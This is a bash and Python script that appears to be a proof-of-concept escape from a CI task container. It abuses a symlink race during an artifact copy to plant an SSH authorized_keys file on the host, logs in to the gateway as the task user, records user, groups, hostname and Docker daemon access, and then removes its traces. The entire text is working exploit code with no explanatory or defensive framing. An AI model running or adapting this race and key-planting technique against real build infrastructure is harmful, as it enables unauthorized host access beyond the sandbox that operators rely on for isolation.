#!/bin/bash
set -eu

probe_root=/tmp/ci-boundary
proof_mount=/builds/worker/host-boundary-proof
private_key="${probe_root}/id_ed25519"
payload_count=6

rm -rf -- "${probe_root}"
mkdir -p "${probe_root}" "${proof_mount}"
ssh-keygen -q -t ed25519 -N '' -f "${private_key}"

python3 - "${probe_root}" "${private_key}.pub" "${payload_count}" <<'PY'
import os
import pathlib
import sys

root = pathlib.Path(sys.argv[1])
public_key = pathlib.Path(sys.argv[2]).read_text()
payload_count = int(sys.argv[3])

for index in range(payload_count):
    payload = root / f"payload-{index:02}"
    ssh_dir = payload / ".ssh"
    race_dir = payload / "src" / "dir"
    link = race_dir / "zzlink"
    ssh_dir.mkdir(parents=True)
    race_dir.mkdir(parents=True)
    link.mkdir()
    ssh_dir.chmod(0o700)
    authorized_keys = ssh_dir / "authorized_keys"
    authorized_keys.write_text(public_key)
    authorized_keys.chmod(0o600)

    padding_count = 9000 + index * 1200
    body = (f"padding-{index:02}-" + "0" * 96 + "\n").encode()
    for padding_index in range(padding_count):
        (race_dir / f"a{padding_index:05}").write_bytes(body)
PY

python3 - "${probe_root}" "${payload_count}" <<'PY' &
import ctypes
import os
import pathlib
import struct
import sys
import threading
import time

root = pathlib.Path(sys.argv[1])
payload_count = int(sys.argv[2])
libc = ctypes.CDLL(None, use_errno=True)
inotify_init1 = libc.inotify_init1
inotify_init1.argtypes = [ctypes.c_int]
inotify_init1.restype = ctypes.c_int
inotify_add_watch = libc.inotify_add_watch
inotify_add_watch.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_uint32]
inotify_add_watch.restype = ctypes.c_int

fd = inotify_init1(0)
if fd < 0:
    raise OSError(ctypes.get_errno(), "inotify_init1")

IN_OPEN = 0x00000020
watches = {}
for index in range(payload_count):
    race_dir = root / f"payload-{index:02}" / "src" / "dir"
    wd = inotify_add_watch(fd, os.fsencode(race_dir), IN_OPEN)
    if wd < 0:
        raise OSError(ctypes.get_errno(), f"inotify_add_watch({race_dir})")
    watches[wd] = (index, race_dir / "zzlink")

(root / "watchers-ready").touch()
pending = set(watches)
timers = []
copy_started = False

def swap(index, link):
    delay = 0.035 + index * 0.045
    time.sleep(delay)
    try:
        link.rmdir()
        link.symlink_to("../..")
    except FileNotFoundError:
        pass

while pending:
    data = os.read(fd, 65536)
    offset = 0
    while offset + 16 <= len(data):
        wd, mask, _cookie, name_len = struct.unpack_from("iIII", data, offset)
        offset += 16 + name_len
        if wd in pending and mask & IN_OPEN:
            if not copy_started:
                (root / "copy-started").touch()
                copy_started = True
            pending.remove(wd)
            index, link = watches[wd]
            timer = threading.Thread(target=swap, args=(index, link), daemon=False)
            timer.start()
            timers.append(timer)

for timer in timers:
    timer.join()
PY

watcher_pid=$!
while [ ! -f "${probe_root}/watchers-ready" ]; do
  sleep 0.05
done

run_id="${RUN_ID}"
task_id_length=$((20 - 5 - 1 - ${#run_id}))
task_user="task_${TASK_ID:0:${task_id_length}}_${run_id}"
proxy_authority="${TASKCLUSTER_PROXY_URL#http://}"
proxy_authority="${proxy_authority#https://}"
gateway="${proxy_authority%%:*}"

(
  while [ ! -f "${probe_root}/copy-started" ]; do
    sleep 0.05
  done
  while [ ! -f "${proof_mount}/ssh-success" ]; do
    if ssh \
      -i "${private_key}" \
      -o BatchMode=yes \
      -o ConnectTimeout=1 \
      -o IdentitiesOnly=yes \
      -o LogLevel=ERROR \
      -o StrictHostKeyChecking=no \
      -o UserKnownHostsFile=/dev/null \
      "${task_user}@${gateway}" /bin/sh -s <<'HOST_PROBE'
set -eu
case "${HOME}" in
  /home/task_*) ;;
  *) exit 90 ;;
esac

proof_dir=
for candidate in "${HOME}"/volume*; do
  if [ -d "${candidate}" ]; then
    proof_dir="${candidate}"
    break
  fi
done
[ -n "${proof_dir}" ] || exit 91
proof_file="${proof_dir}/host-boundary-proof.txt"
{
  echo 'HOST_BOUNDARY_EXECUTION_CONFIRMED'
  printf 'user='; id -un
  printf 'uid='; id -u
  printf 'groups='; id -Gn
  printf 'hostname='; hostname
  if docker version --format 'client={{.Client.Version}} server={{.Server.Version}}'; then
    echo 'docker_daemon_access=true'
  else
    echo 'docker_daemon_access=false'
  fi
} > "${proof_file}"
touch "${proof_dir}/ssh-success"
rm -f -- "${HOME}/.ssh/authorized_keys"
rmdir "${HOME}/.ssh" 2>/dev/null || true
for artifact_dir in "${HOME}"/artifact*; do
  [ -d "${artifact_dir}" ] || continue
  find -P "${artifact_dir}" -type l -name zzlink -delete 2>/dev/null || true
done
HOST_PROBE
    then
      break
    fi
    sleep 0.10
  done
) &

probe_deadline=$((SECONDS + 90))
while [ ! -f "${proof_mount}/ssh-success" ]; do
  if [ "${SECONDS}" -ge "${probe_deadline}" ]; then
    break
  fi
  sleep 0.10
done

for payload_src in "${probe_root}"/payload-*/src; do
  [ -d "${payload_src}" ] || continue
  rm -rf -- "${payload_src}"
done
kill "${watcher_pid}" 2>/dev/null || true
wait "${watcher_pid}" 2>/dev/null || true

[ -f "${proof_mount}/ssh-success" ]
